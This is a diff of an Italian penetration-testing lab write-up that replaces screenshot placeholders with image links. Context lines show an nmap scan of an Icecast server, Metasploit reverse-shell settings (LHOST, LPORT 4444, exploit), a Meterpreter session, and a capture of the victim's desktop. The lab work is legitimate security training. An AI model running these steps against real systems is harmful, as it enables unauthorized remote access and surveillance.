@@ -50,7 +50,7 @@ http://192.168.1.153:8000
 Abbiamo ottenuto una risposta, confermando che Icecast era attivo e rispondeva alle richieste.
 
 **📸 Screenshot:**  
-_(Inserire screenshot del browser che mostra la risposta di Icecast)_
+![SCRAIN2](./SCRAIN2.png)
 
 ---
 
@@ -62,7 +62,8 @@ nmap -p 8000 192.168.1.153
 Ora la porta 8000 risultava **open**, confermando che Icecast era accessibile dalla nostra macchina Kali.
 
 **📸 Screenshot:**  
-_(Inserire screenshot della scansione nmap con la porta aperta)_
+![SCRAIN3](./SCRAIN3.png)
+
 
 ---
 
@@ -81,12 +82,10 @@ set LHOST 192.168.1.150
 set LPORT 4444
 exploit
 ```
-
-**📸 Screenshot del primo tentativo fallito:**  
-_(Inserire screenshot del tentativo fallito)_  
+![SCRAIN1](./SCRAIN1.png)
 
 **📸 Screenshot della sessione Meterpreter ottenuta:**  
-_(Inserire screenshot della sessione Meterpreter avviata con successo)_  
+![SCRAIN4](./SCRAIN4.png)
 
 ---
 
@@ -99,7 +98,7 @@ Una volta ottenuta la sessione Meterpreter:
   Questo comando ha mostrato le interfacce di rete e gli indirizzi IP della macchina vittima.
 
 **📸 Screenshot:**  
-_(Inserire screenshot del comando ipconfig eseguito su Meterpreter)_  
+![SCRAIN7](./SCRAIN7.png)  
 
 - **Cattura di uno screenshot del desktop remoto**:
   ```bash
@@ -113,10 +112,10 @@ xdg-open /home/kali/OquUbpix.jpeg
 ```
 
 **📸 Screenshot del comando screenshot:**  
-_(Inserire screenshot del comando screenshot eseguito con successo)_  
+![SCRAIN5](./SCRAIN5.png)  
 
 **📸 Visualizzazione dello screenshot:**  
-_(Inserire screenshot dell’immagine visualizzata su Kali)_  
+![SCRAIN6](./SCRAIN6.png)  
 
 ---
 
